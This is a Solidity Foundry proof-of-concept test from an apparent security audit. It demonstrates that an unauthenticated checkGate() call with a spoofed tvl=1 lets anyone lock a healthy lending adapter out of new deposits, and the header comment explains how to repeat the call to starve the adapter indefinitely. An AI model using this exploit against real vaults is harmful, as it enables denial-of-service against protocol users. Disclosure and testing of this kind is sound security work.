// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

/**
 * FINDING: `StrategyRebalanceGateModule.checkGate()` takes `enabledAdapters`
 *          and `tvl` as plain, unvalidated calldata parameters and is guarded
 *          only by `onlyDelegateCall` (rejects direct calls to the standalone
 *          module, NOT calls arriving via the vault's fallback dispatcher).
 *          Since `rebalanceGateModule_addr` sits in
 *          `UsdcLendingStrategy.fallback()`'s dispatch chain with no access
 *          check before delegatecall, ANY address can call
 *          `vault.checkGate(apyBpsArray, enabledAdapters, targetAllocs, tvl, moved)`
 *          directly, supplying whatever `tvl`/`enabledAdapters` it likes.
 * SEVERITY: HIGH. New in this branch: firing the P0.4 "cap drift mandate"
 *           check with `emitOnMandate=true` now WRITES STATE —
 *           `lastRelCapMandateTs[hitAdapter] = block.timestamp`
 *           (StrategyRebalanceGateModule.sol:145-153) — which
 *           `StrategyAllocCalcModule._checkAdapterEligibility()`
 *           (StrategyAllocCalcModule.sol:361-370) then reads to make a
 *           targeted adapter fully ineligible for ANY new deposit
 *           (`deployIdle()`, `deposit()`) for up to
 *           `mandateRedeployCooldownSeconds` (governance-configurable, max 30
 *           days). By passing a spoofed `tvl=1`, the absolute hard-ceiling
 *           check `curr > (absCapBps * tvl / 1e4) * (1+tol) / 1e4` collapses
 *           to `curr > 0`, so ANY adapter holding a nonzero real position can
 *           be targeted — for free (gas only), by anyone, repeatably,
 *           indefinitely (just call again before each cooldown window
 *           expires) — a persistent, unauthenticated capital-starvation
 *           attack on a chosen adapter, or the whole fleet.
 */

import { Test, console2 } from "forge-std/Test.sol";
import {
    UsdcMultiLendingVaultTestBase,
    MockUSDC,
    MockLendingAdapter
} from "../UsdcMultiLendingVault.t.sol";

contract UnauthenticatedCheckGate_PoC is UsdcMultiLendingVaultTestBase {
    address attacker = address(0xA11CE);

    function setUp() public override {
        super.setUp();
        _addAndEnableAdapter(adapter1);

        // Give adapter1 a real, nonzero position (a legitimate prior deposit).
        _mintAndTransferToVault(core, 200_000e6);
        vm.prank(core);
        vault.deposit(200_000e6);
        assertGt(vault.positionAssets(address(adapter1)), 0, "sanity: adapter1 holds a real position");

        // Realistic governance configuration enabling the P0.4/P0.7 mandate
        // machinery (both are legitimate, documented protections -- not
        // themselves the bug).
        vm.prank(paramSetter);
        (bool ok1, ) = address(vault).call(abi.encodeWithSignature("setCapDriftTolerance(uint16)", uint16(500)));
        require(ok1, "setCapDriftTolerance failed");

        vm.prank(admin);
        (bool ok2, ) = address(vault).call(abi.encodeWithSignature("setMandateRedeployCooldown(uint32)", uint32(7 days)));
        require(ok2, "setMandateRedeployCooldown failed");
    }

    function test_POC_unprivileged_caller_locks_out_healthy_adapter_via_spoofed_checkGate() public {
        assertEq(vault.lastRelCapMandateTs(address(adapter1)), 0, "sanity: no mandate cooldown active yet");
        assertFalse(vault.hasRole(vault.KEEPER_ROLE(), attacker));
        assertFalse(vault.hasRole(vault.PARAM_ROLE(), attacker));
        assertFalse(vault.hasRole(vault.DEFAULT_ADMIN_ROLE(), attacker));

        address[] memory targets = new address[](1);
        targets[0] = address(adapter1);
        uint16[] memory apys = new uint16[](0);       // never read: mandate fires before this is touched
        uint256[] memory targetAllocs = new uint256[](0);

        vm.prank(attacker);
        (bool ok, bytes memory ret) = address(vault).call(
            abi.encodeWithSignature(
                "checkGate(uint16[],address[],uint256[],uint256,uint256)",
                apys, targets, targetAllocs,
                uint256(1),   // spoofed tvl=1 collapses the hard ceiling to ~0
                uint256(0)
            )
        );
        require(ok, "checkGate call unexpectedly failed");
        (bool gateOk, ) = abi.decode(ret, (bool, int256));
        assertTrue(gateOk, "sanity: mandate fired and the (spoofed) gate unconditionally passed");

        assertGt(
            vault.lastRelCapMandateTs(address(adapter1)), 0,
            "VULNERABLE: an unprivileged, unrelated caller started a real mandate cooldown against a healthy adapter"
        );

        // Downstream: the adapter is now fully ineligible for new capital,
        // even though nothing about its actual health or exposure changed.
        usdc.mint(address(vault), 50_000e6);
        uint256 posBefore = vault.positionAssets(address(adapter1));
        vm.warp(block.timestamp + vault.minSecondsBetweenDeployIdle() + 1);
        vm.prank(keeper);
        (bool okDeploy, ) = address(vault).call(abi.encodeWithSignature("deployIdle()"));
        require(okDeploy, "deployIdle() call unexpectedly failed");

        assertEq(
            vault.positionAssets(address(adapter1)), posBefore,
            "VULNERABLE: adapter1 received zero new capital -- locked out of allocation by the attacker's spoofed call"
        );

        // The attacker can repeat this call right before each cooldown
        // window expires to keep the adapter starved indefinitely, for the
        // cost of gas alone.
    }
}
